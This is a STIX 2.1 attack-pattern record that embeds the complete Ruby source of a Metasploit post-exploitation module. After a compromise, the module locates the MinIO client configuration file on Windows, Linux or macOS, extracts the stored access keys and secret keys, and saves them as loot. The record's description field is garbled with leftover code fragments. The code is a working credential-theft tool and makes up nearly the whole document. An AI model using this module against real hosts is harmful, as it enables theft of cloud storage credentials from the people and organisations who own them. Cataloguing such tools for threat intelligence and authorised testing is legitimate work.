{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09fb4e12-83b1-44b3-a316-84c7df9f2c3b",
    "created": "2024-08-14T16:33:19.186305Z",
    "modified": "2024-08-14T16:33:19.186309Z",
    "name": "Gather MinIO Client Key",
    "description": " This is a module that searches for MinIO Client credentials on a windows remote host.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/minio_client.rb",
            "external_id": "minio_client.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather MinIO Client Key',\n        'Description' => %q{\n          This is a module that searches for MinIO Client credentials on a windows remote host.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MinIO-Client-7d940c60ae8545aeaa29c96536dda855' ]\n        ],\n        'Author' => ['Kali-Team <kali-team[at]qq.com>'],\n        'Platform' => [ 'win', 'linux', 'osx', 'unix' ],\n        'SessionTypes' => %w[meterpreter powershell shell],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MinIO Client']),\n      ]\n    )\n  end\n\n  def parser_minio(config_path)\n    print_status(\"Parsing file #{config_path}\")\n    some_result = Hash.new\n    if file?(config_path)\n      file_contents = read_file(config_path)\n      if file_contents.blank?\n        print_warning('Configuration file content is empty')\n        return some_result\n      end\n      begin\n        configuration = JSON.parse(file_contents)\n        if !configuration['aliases'].nil?\n          some_result = configuration['aliases']\n        end\n      rescue JSON::ParserError => e\n        print_error(\"Unable to parse configuration:#{e}\")\n      end\n    else\n      print_error(\"Configuration file not found:#{config_path}\")\n    end\n    return some_result\n  end\n\n  def print_and_save(all_result)\n    columns = [\n      'name',\n      'url',\n      'accessKey',\n      'secretKey',\n      'api',\n      'path',\n    ]\n    tbl = Rex::Text::Table.new(\n      'Header' => 'MinIO Client Key',\n      'Columns' => columns\n    )\n\n    all_result.each do |name, item|\n      row = [name, item['url'], item['accessKey'], item['secretKey'], item['api'], item['path']]\n      tbl << row\n    end\n\n    print_line(tbl.to_s)\n    if tbl.rows.count > 0\n      path = store_loot('host.minio', 'text/plain', session, tbl, 'minio_client.txt', 'MinIO Client Key')\n      print_good(\"Session info stored in: #{path}\")\n    end\n  end\n\n  def get_config_file_path\n    case session.platform\n    when 'windows'\n      home = get_env('USERPROFILE')\n      return if home.nil?\n\n      config_path = home + '\\\\mc\\\\config.json'\n      return config_path\n    when 'linux', 'osx', 'unix'\n      home = get_env('HOME')\n      return if home.nil?\n\n      config_path = home + '/.mc/config.json'\n      return config_path\n    end\n  end\n\n  def run\n    # used to grab files for each user on the remote host\n    config_path = datastore['CONFIG_PATH'] || ''\n    result = Hash.new\n    if config_path.empty?\n      result = parser_minio(get_config_file_path)\n    else\n      result = parser_minio(config_path)\n    end\n    return if result.empty?\n\n    print_and_save(result)\n  end\nend\n",
    "x_mitre_contributors": [
        "[Kali-Team <kali-team[at]qq.com>]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win', 'linux', 'osx', 'unix' ]"
    ]
}